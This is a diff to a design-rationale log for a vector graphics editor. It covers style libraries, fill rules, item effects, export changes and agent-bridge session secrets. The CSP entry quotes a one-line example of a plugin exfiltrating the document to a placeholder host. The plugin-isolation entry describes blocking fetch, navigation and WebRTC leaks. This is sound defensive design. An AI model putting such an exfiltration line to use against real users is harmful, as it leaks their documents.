@@ -43,6 +43,7 @@ frontend/
     │   ├── harmony.ts          colour harmony rules and variations
     │   ├── symbolism.ts        instance tint, instance art and the symbolism operations
     │   ├── pattern.ts          tile lattices and the pattern editing session
+    │   ├── style-libraries.ts  built-in graphic style libraries
     │   ├── livepaint.ts        Live Paint faces, gap closing and face paint
     │   ├── transform.ts        node transforms
     │   ├── snap.ts             point, grid and smart guide snapping
@@ -114,6 +115,10 @@ Scripts with entries, in folder order. Every other script is in the map above wi
 - src/engine/livepaint.ts
 - src/engine/threed.ts
 - src/engine/pattern.ts
+- src/engine/bounds.ts
+- src/engine/ops/objects.ts
+- src/engine/ops/expand.ts
+- src/engine/style-libraries.ts
 - src/extensions/registry.ts
 - src/tools/select.ts
 - src/tools/pen.ts
@@ -124,6 +129,7 @@ Scripts with entries, in folder order. Every other script is in the map above wi
 - src/tools/symbolism.ts
 - src/tools/type.ts
 - src/tools/view.ts
+- src/io/api.ts
 - src/io/project-io.ts
 - src/io/svg.ts
 - src/io/pdf.ts
@@ -152,6 +158,8 @@ Scripts with entries, in folder order. Every other script is in the map above wi
 - src/ui/panels/preview-edit.ts
 - src/ui/panels/effect-gallery.ts
 - src/ui/panels/three-d.ts
+- src/ui/panels/appearance.ts
+- src/ui/panels/attributes.ts
 - src/ui/form-dialog.ts
 - src/ui/palette.ts
 - src/ui/icons.ts
@@ -167,6 +175,13 @@ Scripts with entries, in folder order. Every other script is in the map above wi
 - logged: v0.9.0 · 2026-10-07
 
 Runs before any stylesheet so the saved theme profile and accent are on the root element before first paint (no theme flash on hard reload). Keep its PROFILES table in step with `src/ui/themes.ts` (same 15 ids, surface variables only; themes.ts re-applies everything after the bundle loads). Light profiles get `theme-light` on body through a MutationObserver the moment body exists. The comments formvis carried here were moved to this entry.
+
+### index.html · content security policy
+- refers-to: index.html :: meta http-equiv Content-Security-Policy; src/plugins/host.ts :: CSP
+- kind: rationale
+- logged: v0.17.0 · 2026-10-08
+
+`frame-src 'none'; object-src 'none'` and nothing more. A frame's own policy cannot stop the frame navigating itself, so a plugin could have sent the document out as `location.href = 'https://host/?' + svg`; the parent's `frame-src` is what governs navigations inside its frames, and `'none'` refuses every one while `srcdoc` plugin frames still load (checked in Chromium: the navigation is refused, the frame runs). formpth has no other frames or plugins, so nothing else is affected. A fuller app policy (script, style, connect) was left out: Vite's dev client, inline styles set from code and the theme boot script would each need allowances, and the threat it would guard against is already covered by the plugin frames' own policy. The Tauri `security.csp` stays `null` for the reason in backend/HASHOUT_LOG.md (tauri origins left out of the bridge).
 
 ## vite.config.ts
 
@@ -211,6 +226,13 @@ const { pathOperation } = await import('./engine/ops/paths');
 
 The label toggles between Outline and Preview, as Illustrator's View menu does. formvis's GPU Preview wording does not apply: formpth has no GPU renderer.
 
+### src/app.ts · Attributes, effect targets and style libraries
+- refers-to: src/app.ts :: TAB_HOMES attributes, commands fx-*, effect-gallery, gs-lib-*, menus Window
+- kind: explainer
+- logged: v0.17.0 · 2026-10-08
+
+Attributes joins the Stroke group (Window > Attributes comes from `TAB_HOMES`). The `fx-*` commands and Effect Gallery pass the Appearance panel's `effectSlot()` and are enabled when it has one, so an effect lands on the targeted fill, stroke or layer. Window > Graphic Style Libraries lists one `gs-lib-<id>` command per library, which shows the Graphic Styles panel on that library. The Window menu is taller than a 1000 px window and scrolls, as it did before; hovering a submenu at the bottom needs the menu scrolled to it first.
+
 ## src/automation/agent-bridge.ts
 
 ### src/automation/agent-bridge.ts · add_text default colour
@@ -248,6 +270,20 @@ The consent prompt promises that each change is one undoable step, but a call su
 
 Each tool calls the same engine methods as the menus and tools, so an agent's Live Paint group, tracing object, stained symbol set or edited pattern is the same object a person gets. `image_trace` with only `view` changes the view without tracing again. `edit_anchors` insert takes `t` as a fraction along a straight segment, converted to the curve parameter (the inverse of 3t squared minus 2t cubed) because a straight segment is stored as a cubic with its handles on its ends.
 
+### src/automation/agent-bridge.ts · bridge session
+- refers-to: src/automation/agent-bridge.ts :: AgentBridge.loop, refocused, setEnabled, secret; src/io/api.ts :: mcpSession, mcpNext, mcpResult, mcpStop
+- kind: explainer
+- logged: v0.17.0 · 2026-10-08
+
+The loop claims a secret from the engine before its first poll and sends it with every bridge call through `io/api.ts` (it used to `fetch` the bridge directly with a GET). 403 means the engine no longer knows the secret (it restarted), so the loop claims a new one after a second; 205 means another window took the bridge over, so the loop drops its secret and waits for this window to gain focus before claiming again, which hands the bridge back to whichever window the person is using without two windows taking it from each other in turn. The `allowed` flag now travels in the POST body (a missing flag means not allowed); turning agents off posts `stop` with the secret. The editor's own switch still decides whether a call runs (`this.on`).
+
+### src/automation/agent-bridge.ts · attributes, item effects and style libraries
+- refers-to: src/automation/agent-bridge.ts :: run cases attributes, apply_effect, graphic_style
+- kind: explainer
+- logged: v0.17.0 · 2026-10-08
+
+`attributes` checks that the objects have a fill rule at all before setting one (text and images have none), reverses through `pathOp('reverse')` so it is the same command as the menu, and answers with each object's rule from `fillRuleOf`. `apply_effect` with `item` checks every target has that item and refuses 3D effects (`isItemEffect`) with a message that says to drop `item`; the engine's `addEffect` does the work. `graphic_style` resolves libraries by id or name through `styleLibrary`; `apply` with `library` goes through `useLibraryStyle`, which adds the style and applies it in one history step.
+
 ## src/engine/index.ts
 
 ### src/engine/index.ts · beginGesture and endGesture
@@ -263,6 +299,13 @@ Sliders and typing call `edit` many times per gesture. Inside a gesture, every e
 - logged: v0.9.0 · 2026-10-07
 
 A new project is fitted to the last stage size the stage reported. Before, the first document of a session copied the size from `this.current`, which was null, so it fitted an 800 by 600 default and sat off-centre until the window resized.
+
+### src/engine/index.ts · fill rules, layer targets and graphic style links
+- refers-to: src/engine/index.ts :: fillRuleOf, setFillRule, targetLayer, appearanceTarget, select, addEffect item, addGraphicStyle, graphicStyleOf, redefineGraphicStyle, breakGraphicStyleLink, loadStyleLibrary, useLibraryStyle, styleLinked, withStyle; src/engine/project.ts :: Project.layerTarget
+- kind: rationale
+- logged: v0.17.0 · 2026-10-08
+
+`setFillRule` is one edit that leaves the selection alone (going through `run` would have selected the paths inside a selected group) and does nothing when every target already has the rule. A targeted layer is `Project.layerTarget`: `targetLayer` selects the layer's objects, as the Layers target always did, and then marks the layer so `appearanceTarget` returns it; any other `select` clears the mark, and panels pass the layer's id to the edits so the change lands on the layer, not its objects. A graphic style link is the `style` id on a node, but it only counts while the node still looks like the style (`styleLinked` compares the appearance, and opacity and blend for non-type objects), so editing an object by hand ends the link without every appearance edit having to clear it. Redefine updates the style and every object still linked, makes the source object linked, and unlinks objects that had drifted, all in one step. New Graphic Style now links its source object, as in Illustrator. `useLibraryStyle` adds a library style unless the document already has one of that name, and applies it, in one edit. `Project.layerTarget` is session state and is never saved.
 
 ## src/engine/history.ts
 
@@ -331,6 +374,13 @@ Keyed by node identity. Never mutate a node in place: the cache would keep drawi
 - logged: v0.14.0 · 2026-10-07
 
 A layer with an Effect Gallery filter is rendered whole, not clipped to the canvas (up to six million pixels), with its translation rounded to whole device pixels, and kept per node. Panning then redraws the cached canvas instead of running the filter again; it is rebuilt when the node, the document, the skip set, the zoom, the font epoch or the layer epoch changes. The stage bumps the layer epoch when a placed image finishes decoding, since the node and the document stay the same while its pixels arrive. Other raster effects stay clipped and uncached because they are cheap.
+
+### src/engine/render.ts · effects on one fill or stroke
+- refers-to: src/engine/render.ts :: drawShapeItems, drawItem, itemKey, strokeWith solo, drawBody layer; src/engine/effects.ts :: rasterEffectsOf, isItemEffect
+- kind: explainer
+- logged: v0.17.0 · 2026-10-08
+
+Vector effects on an item already changed its geometry (`itemGeometry`). Raster effects on an item (drop shadow, glows, feather, Gaussian Blur, the Effect Gallery) now draw that item alone into a `withLayer` sized to its geometry plus its stroke reach, run the effects there, and composite the result with the item's own opacity and blend mode; inside the layer the item is drawn `solo` (full opacity, normal blend) so those are applied once. Gallery filters on an item are cached like a node's, keyed by a token per geometry and item (`itemKey`), because one item object is shared by every object a graphic style was applied to. `rasterEffectsOf(effects)` is the list form `rasterEffects(n)` now calls. Layers draw their own fills and strokes over their children, as groups did.
 
 ## src/engine/filters.ts
 
@@ -506,6 +556,49 @@ Every tile type is a rectangular repeat unit holding one or two copies of the ar
 
 Pattern editing mode is isolation mode on a temporary group named Pattern Tile holding copies of the selection (Make) or of the pattern's art (Edit), so every tool, panel and agent call works on the tile unchanged. The session lives on the project, outside the document, so its preview settings (copies, dim, tile edge) never become history steps; only the art does. Size Tile to Art takes the tile from the art's bounds on every read, so moving or growing the art moves the tile; with it off, the width and height are centred on the art and spacing does not apply. Done removes the group, writes the pattern and its swatch, and squashes every step since entering into one Make Pattern or Edit Pattern step. Cancel rewinds history to the mark taken on entering, dropping those steps, so redo cannot bring the temporary group back. Undoing past the entry removes the group, and `pruneSelection` ends the session when its group is gone. Escape and Exit Isolation Mode mean Done.
 
+## src/engine/bounds.ts
+
+### src/engine/bounds.ts · item reach
+- refers-to: src/engine/bounds.ts :: visualBounds, itemsReach, effectsReach, effectReach
+- kind: explainer
+- logged: v0.17.0 · 2026-10-08
+
+Visual bounds add, per visible item, its stroke reach plus the reach of its own effects (an offset outline, a shadow on a stroke), and groups and layers with their own fills and strokes add the same over their children. Without it a shadow on one stroke was clipped by the item layer and the dirty rectangle.
+
+## src/engine/ops/objects.ts
+
+### src/engine/ops/objects.ts · makeCompound fill rule and direction
+- refers-to: src/engine/ops/objects.ts :: makeCompound, subArea
+- kind: rationale
+- logged: v0.17.0 · 2026-10-08
+
+Make Compound Path takes the bottom object's rule when it is a path or a compound path and Non-Zero Winding otherwise, Illustrator's documented default (it used to make even-odd unless the bottom was a compound). So that the result still has the holes people expect, the bottom object's subpaths keep their direction and every closed subpath from the objects above is turned to run opposite to the bottom's first closed subpath (`reversePath` where the signed area has the same sign): where a front path overlaps the bottom one the winding sums to zero. Even-odd ignores direction, so the reorientation never changes an even-odd result, and a compound switched to even-odd later looks the same for the usual nested and overlapping shapes. Paths dropped `live` already; reversed paths keep their anchors and handles.
+
+### src/engine/ops/objects.ts · fillRuleTargets
+- refers-to: src/engine/ops/objects.ts :: fillRuleTargets, setFillRule
+- kind: explainer
+- logged: v0.17.0 · 2026-10-08
+
+Paths and compound paths are targets; a path whose parent is a compound path (picked with Direct Selection) stands for that compound, since a subpath's own rule is never read; groups and other containers pass the rule to the paths inside. `PathNode.rule` already existed with `nonzero` for new paths, so no file format change was needed.
+
+## src/engine/ops/expand.ts
+
+### src/engine/ops/expand.ts · item raster effects
+- refers-to: src/engine/ops/expand.ts :: expandAppearance
+- kind: rationale
+- logged: v0.17.0 · 2026-10-08
+
+Expand Appearance bakes an item's vector effects into the piece it makes, as before, and now keeps its raster effects live on that piece (on the shape itself, or on a group of the stroke's pieces), where they used to be dropped.
+
+## src/engine/style-libraries.ts
+
+### src/engine/style-libraries.ts · STYLE_LIBRARIES
+- refers-to: src/engine/style-libraries.ts :: STYLE_LIBRARIES, styleLibrary
+- kind: explainer
+- logged: v0.17.0 · 2026-10-08
+
+Five libraries generated in code, every style built only from things formpth renders and exports: Shadows and Glows (drop shadows, a long shadow made with a Transform effect of 40 copies on the lower fill only, glows, a neon stroke blurred under sharp ones, feather), Buttons (gradients, round corners, a gloss fill inset with Offset Path, inner glows), Outlines (sticker strokes, offset and inset strokes, stitched dashes, roughened ink, zig zag), Textures (Effect Gallery grain, watercolor, halftone, mosaic, stained glass and texturizer on the fill only, so strokes stay crisp) and Scribbles (scribble fills and crosshatch, pencil-sketch strokes). Many use effects on one fill or stroke, which is what makes them more than a fill and a stroke. Effects are built from their defaults (`effectDefaults`) with a few overrides, so a parameter added later gets its default. `styleLibrary` matches an id or a name, with spaces, dashes and underscores alike.
+
 ## src/extensions/registry.ts
 
 ### src/extensions/registry.ts · snapRect
@@ -659,6 +752,15 @@ Choosing a type tool with nothing selected sets the fill to black and the stroke
 
 Drag on the pasteboard draws a new artboard; drag inside one moves it with its art (Alt duplicates it); its handles resize; Delete removes the active one.
 
+## src/io/api.ts
+
+### src/io/api.ts · bridge calls
+- refers-to: src/io/api.ts :: mcpSession, mcpNext, mcpResult, mcpStop, BRIDGE_HEADER, BridgeItem
+- kind: explainer
+- logged: v0.17.0 · 2026-10-08
+
+The window's side of the agent bridge goes through here now, as every other engine call does. `mcpSession` POSTs for a secret (null when the engine refuses or is down); `mcpNext` POSTs `{allowed}` with the secret in `X-Formpth-Bridge` and returns the status with the item, because the loop acts on 204, 205 and 403 differently; `mcpResult` and `mcpStop` carry the secret too. The unused GET-based `mcpNext` they replace took no secret.
+
 ## src/io/project-io.ts
 
 ### src/io/project-io.ts · artboard rect
@@ -691,7 +793,21 @@ With `preserve`, the base64 manifest goes in a metadata element with id `formpth
 
 SVG filter primitives cannot express the Effect Gallery effects, so an object carrying one is drawn whole (with its other effects) at the document's raster resolution, capped at sixteen million pixels, and written as an image at its visual bounds with its opacity and blend mode. With `preserve` the editing data still holds the live effect, so formpth reopens it editable.
 
+### src/io/svg.ts · item filters and layer appearance
+- refers-to: src/io/svg.ts :: Writer.shape, Writer.item, Writer.baked, Writer.node layer
+- kind: explainer
+- logged: v0.17.0 · 2026-10-08
+
+`shape` writes each item through `item` and, when the item has raster effects, wraps just that item's elements in a `<g filter>` built by the same `filter` as objects use, so a shadow on a stroke stays on the stroke. An Effect Gallery filter on any item bakes the whole object to an image, as one on the object does. Layers now write their own fills and strokes over their children, and their blend mode and raster effects on the layer `<g>`; a layer with a gallery effect is baked inside its `<g id>` so it still opens as a layer. The outside-stroke mask now honours even-odd.
+
 ## src/io/pdf.ts
+
+### src/io/pdf.ts · group and layer items
+- refers-to: src/io/pdf.ts :: Writer.needsRaster, Writer.body
+- kind: explainer
+- logged: v0.17.0 · 2026-10-08
+
+Groups and layers draw their own fills and strokes over their children; the PDF writer skipped them, so a group stroke was on screen and in SVG but not in PDF. An object whose items carry raster effects is rasterised at the document's resolution, like one with raster effects of its own.
 
 ### src/io/pdf.ts · patterns inside form XObjects
 - refers-to: src/io/pdf.ts :: Painter.pattern
@@ -819,6 +935,13 @@ A tracing object is a group carrying `trace`: the source image node, the options
 
 Plugins reach every agent tool except `open_file`, `save_project`, `export_file` and `place_image`, so a plugin can never read or write the person's files.
 
+### src/plugins/host.ts · network isolation
+- refers-to: src/plugins/host.ts :: CSP, RUNTIME, PluginHost.load; index.html :: Content-Security-Policy meta
+- kind: rationale
+- logged: v0.17.0 · 2026-10-08
+
+A plugin can call `get_svg` and `get_document`, so its frame must not be able to send anything out. Each frame's `srcdoc` starts with a policy meta before any script: `default-src 'none'`, inline scripts and `eval` only (eval reaches no network, and plugins may use it), inline styles, `data:` and `blob:` images, `data:` fonts, and `connect-src`, `frame-src`, `child-src`, `worker-src`, `object-src`, `form-action` and `base-uri` all `'none'`, plus `x-dns-prefetch-control: off` and `referrerpolicy="no-referrer"`. Navigating the frame away is refused by the app's own `frame-src 'none'` (see index.html), which a frame's policy cannot do. CSP has no control over WebRTC (Chromium does not implement the `webrtc` directive; a test frame sent STUN packets under `connect-src 'none'`), so the runtime makes the RTC constructors `undefined` and non-configurable before the plugin's code runs; a fresh constructor cannot be taken from a nested frame, because without `allow-same-origin` every nested document gets its own opaque origin (tested: reading it throws a SecurityError). Checked in the app with a plugin that read the SVG and tried `fetch`, an image and `RTCPeerConnection`: the tool call worked and all three were blocked. Plugins keep the DOM; running them in a Worker would close more doors but break plugins that parse SVG with `DOMParser`.
+
 ## src/ui/stage.ts
 
 ### src/ui/stage.ts · two canvases
@@ -882,6 +1005,13 @@ Buttons run command ids from `app.ts` (for example `pf-unite`, `make-clip`, `cre
 - logged: v0.9.0 · 2026-10-07
 
 One `patchList` over the flattened tree; `create` fills the row immediately so a new row never shows empty. `--depth` indents and `--lc` carries the layer colour for the stripe and the selection square.
+
+### src/ui/layers.ts · layer target circle
+- refers-to: src/ui/layers.ts :: LayersPanel.bind, fill; src/engine/index.ts :: Engine.targetLayer
+- kind: explainer
+- logged: v0.17.0 · 2026-10-08
+
+A layer's target circle targets the layer itself (`targetLayer`): its objects are selected as before and the Appearance panel shows the layer. With Shift, Ctrl or Cmd it still adds the layer's objects to the selection. The circle gets a ring while its layer is targeted (`is-targeted`) and fills when the layer has an appearance of its own (fills, strokes, effects or a blend mode; layer opacity is the Dim Images setting, so it does not count).
 
 ## src/ui/rail.ts
 
@@ -1057,6 +1187,13 @@ Both states of the panel (the hint with Make Pattern, and the options form) are 
 
 Dialog previews run through the engine's drag preview (`beginDrag`, `dragTo`), so Cancel restores the document exactly and OK commits one history step.
 
+### src/ui/panels/preview-edit.ts · effect slots
+- refers-to: src/ui/panels/preview-edit.ts :: effectDialog, EffectSlot
+- kind: explainer
+- logged: v0.17.0 · 2026-10-08
+
+`effectDialog` takes an `EffectSlot`: the node, the effect's index (-1 to add a new one) and optionally an item. With an item it edits or appends that fill's or stroke's effects; without one, the object's. A slot naming a node (a targeted layer) applies there instead of to the selection. A 3D effect asked for on an item goes to the object, with a notice, because it turns the whole object.
+
 ## src/ui/panels/three-d.ts
 
 ### src/ui/panels/three-d.ts · ThreeDPanel
@@ -1081,6 +1218,38 @@ Map Art shows for Extrude and Plane, Shadow for every kind but Inflate, and Infl
 - logged: v0.14.0 · 2026-10-07
 
 The dialog is built once on first use. Thumbnails and the preview have fixed canvas sizes and are drawn from the selected objects with each effect appended, the thumbnails a few at a time per frame (about ten milliseconds) so opening never stalls, the preview on the next frame after any change. Each effect's options page is created the first time it is picked and then only hidden and shown, so switching effects never rebuilds a page. The preview stays in the dialog and the document is untouched until OK, which adds the effect as one history step through `addEffect`; a double-click on a thumbnail picks it and applies it.
+
+### src/ui/panels/effect-gallery.ts · item slot
+- refers-to: src/ui/panels/effect-gallery.ts :: EffectGallery.run, draw, finish, item
+- kind: explainer
+- logged: v0.17.0 · 2026-10-08
+
+`run` takes the Appearance panel's slot: the thumbnails and the preview then show the effect on the targeted fill or stroke only, and OK adds it there (or to the targeted layer).
+
+## src/ui/panels/appearance.ts
+
+### src/ui/panels/appearance.ts · targeted items
+- refers-to: src/ui/panels/appearance.ts :: AppearancePanel.rows, effectSlot, pick, duplicate, remove, shift, toggle, sync, fill; src/app.ts :: fx commands, effect-gallery
+- kind: rationale
+- logged: v0.17.0 · 2026-10-08
+
+Rows are keyed `i<n>` for items, `i<n>e<k>` for an item's effects (listed under it, indented), `c` for Contents on groups and layers, `e<k>` for the object's effects and `o` for opacity, so adding or moving an effect patches rows in place. Clicking a fill or stroke row targets it; `effectSlot` hands that target to every Effect menu command and to the Effect Gallery, which is how Illustrator applies an effect to the targeted item, and is also how a targeted layer receives effects. The target clears when the panel's object changes, so a stale pick never redirects a later effect. A stroke's name opens the weight dialog only once the stroke is targeted, so the first click can target it. Contents shows where a group's or layer's own fills and strokes draw (over the contents) and cannot be hidden or moved, like the Opacity row. The panel's object is `appearanceTarget`, and every edit passes the layer's id when a layer is targeted.
+
+### src/ui/panels/appearance.ts · GraphicStylesPanel
+- refers-to: src/ui/panels/appearance.ts :: GraphicStylesPanel.showLibrary, redefine, sync, fill; src/engine/style-libraries.ts :: STYLE_LIBRARIES
+- kind: explainer
+- logged: v0.17.0 · 2026-10-08
+
+The Library select switches the grid between the document's styles and a built-in library (tiles keyed `<library>:<index>`); clicking a library tile adds the style to the document and applies it, and Redefine and Delete are disabled while a library shows. The style the target is linked to gets `is-linked`; the clicked one gets `is-picked`, and Redefine uses the picked style, else the linked one. Break Link now calls the engine method the agent tool uses.
+
+## src/ui/panels/attributes.ts
+
+### src/ui/panels/attributes.ts · AttributesPanel
+- refers-to: src/ui/panels/attributes.ts :: AttributesPanel; src/engine/index.ts :: fillRuleOf, setFillRule, pathOp reverse, setObjectProps note
+- kind: rationale
+- logged: v0.17.0 · 2026-10-08
+
+Fill Rule buttons (Non-Zero Winding, Even-Odd) with the current rule named beside them (Mixed when the targets differ), Reverse Path Direction, and the object Note. Show Center and Overprint are left out: formpth draws no centre point and has no separations or overprint preview, so either control would store a value nothing reads. `NodeBase.note` existed with no way to set or read it; the panel and the `attributes` tool now do, `get_object` returns it, and `.fpth` keeps it. The note is written on change (blur) and never overwritten while the field has focus. Built once; every value is patched with the guarded setters.
 
 ## src/ui/form-dialog.ts
 
